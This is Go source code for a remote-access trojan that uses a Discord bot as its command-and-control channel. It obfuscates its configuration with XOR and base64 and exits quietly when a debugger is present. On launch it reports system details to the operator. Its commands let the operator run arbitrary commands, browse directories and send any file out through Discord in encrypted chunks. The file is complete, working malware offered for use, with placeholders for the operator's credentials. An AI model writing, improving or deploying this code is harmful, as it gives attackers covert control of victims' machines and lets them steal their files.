package main

import (
	"context"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
)

// ============================================================
// HARDCODED ENCRYPTED CONFIGURATION
// Generate these using: go run tools/builder.go
// ============================================================
const (
	encToken   = ""  // PASTE YOUR ENCRYPTED TOKEN HERE
	encOwnerID = ""  // PASTE YOUR ENCRYPTED OWNER ID HERE
	encChanID  = ""  // PASTE YOUR ENCRYPTED CHANNEL ID HERE
)

// ============================================================
// GLOBAL VARIABLES
// ============================================================
var (
	startTime = time.Now()
	// Static key matching your builder.go for immediate functionality
	xorKey    = []byte{0xDE, 0xAD, 0xBE, 0xEF} 
	agentID   = generateSecureID()
	cooldown  = sync.Map{}
	token, ownerID, chanID string
)

// --- CRYPTO ENGINE ---

func Crypt(input string) string {
	b := []byte(input)
	for i := 0; i < len(b); i++ {
		b[i] ^= xorKey[i%len(xorKey)]
	}
	return base64.StdEncoding.EncodeToString(b)
}

func Decrypt(input string) (string, error) {
	data, err := base64.StdEncoding.DecodeString(input)
	if err != nil { return "", err }
	for i := 0; i < len(data); i++ {
		data[i] ^= xorKey[i%len(xorKey)]
	}
	return string(data), nil
}

// --- CORE AGENT ---

func main() {
	token, _ = Decrypt(encToken)
	ownerID, _ = Decrypt(encOwnerID)
	chanID, _ = Decrypt(encChanID)

	// Silent exit if config is invalid
	if token == "" || ownerID == "" || chanID == "" { os.Exit(0) }
	if isBeingDebugged() { os.Exit(0) }

	dg, err := discordgo.New("Bot " + token)
	if err != nil { os.Exit(0) }

	dg.AddHandler(handleMessage)
	if err := dg.Open(); err != nil { os.Exit(0) }

	// Heartbeat with system metadata
	safeSendChunked(dg, chanID, fmt.Sprintf("INF|%s|%s|%s", agentID, runtime.GOOS, runtime.GOARCH))

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, os.Interrupt, syscall.SIGTERM)
	<-stop
	dg.Close()
}

func handleMessage(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.ID != ownerID { return }
	plain, err := Decrypt(m.Content)
	if err != nil { return }

	parts := strings.Fields(plain)
	if len(parts) < 2 || (parts[0] != agentID && parts[0] != "all") { return }

	task, args := parts[1], parts[2:]
	if isRateLimited(m.Author.ID, task) { return }

	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	runTask(ctx, s, m.ChannelID, task, args)
}

func runTask(ctx context.Context, s *discordgo.Session, cid, task string, args []string) {
	switch task {
	case "ping":
		safeSendChunked(s, cid, "PONG")

	case "sysinfo":
		wd, _ := os.Getwd()
		res := fmt.Sprintf("ID:%s|OS:%s|ARCH:%s|CPU:%d|WD:%s", agentID, runtime.GOOS, runtime.GOARCH, runtime.NumCPU(), wd)
		safeSendChunked(s, cid, res)

	case "exec":
		if len(args) == 0 { return }
		cmd := exec.CommandContext(ctx, args[0], args[1:]...)
		out, err := cmd.CombinedOutput()
		if err != nil {
			safeSendChunked(s, cid, fmt.Sprintf("ERR|%v|OUT:%s", err, string(out)))
			return
		}
		safeSendChunked(s, cid, string(out))

	case "ls":
		dir := "."
		if len(args) > 0 { dir = filepath.Clean(args[0]) }
		files, err := os.ReadDir(dir)
		if err != nil {
			safeSendChunked(s, cid, "ERR|"+err.Error())
			return
		}
		var out strings.Builder
		for i, f := range files {
			if i > 50 { 
				out.WriteString(fmt.Sprintf("\n... and %d more files", len(files)-i))
				break 
			}
			name := f.Name()
			if f.IsDir() { name += "/" }
			out.WriteString(name + "\n")
		}
		safeSendChunked(s, cid, out.String())

	case "cd":
		if len(args) > 0 { 
			if err := os.Chdir(args[0]); err != nil {
				safeSendChunked(s, cid, "ERR|"+err.Error())
				return
			}
			wd, _ := os.Getwd()
			safeSendChunked(s, cid, "WD:"+wd)
		}

	case "download":
		if len(args) == 0 { return }
		data, err := os.ReadFile(args[0])
		if err != nil {
			safeSendChunked(s, cid, "ERR|"+err.Error())
			return
		}
		safeSendChunked(s, cid, "FILE|"+args[0]+"|"+base64.StdEncoding.EncodeToString(data))
	}
}

func safeSendChunked(s *discordgo.Session, cid, msg string) {
	encrypted := Crypt(msg)
	const maxChunk = 1400 

	if len(encrypted) <= 1900 {
		s.ChannelMessageSend(cid, encrypted)
		return
	}

	for i := 0; i < len(encrypted); i += maxChunk {
		end := i + maxChunk
		if end > len(encrypted) { end = len(encrypted) }
		chunkNum := i/maxChunk + 1
		total := (len(encrypted) + maxChunk - 1) / maxChunk
		s.ChannelMessageSend(cid, fmt.Sprintf("C|%d/%d|%s", chunkNum, total, encrypted[i:end]))
	}
}

func isRateLimited(uid, cmd string) bool {
	key := uid + ":" + cmd
	if last, ok := cooldown.Load(key); ok {
		if time.Since(last.(time.Time)) < 2*time.Second { return true }
	}
	cooldown.Store(key, time.Now())
	return false
}

func isBeingDebugged() bool {
	if runtime.GOOS == "windows" {
		k32 := syscall.NewLazyDLL("kernel32.dll")
		r, _, _ := k32.NewProc("IsDebuggerPresent").Call()
		return r != 0
	}
	return false
}

func generateSecureID() string {
	b := make([]byte, 2)
	rand.Read(b)
	return fmt.Sprintf("%x", b)
}
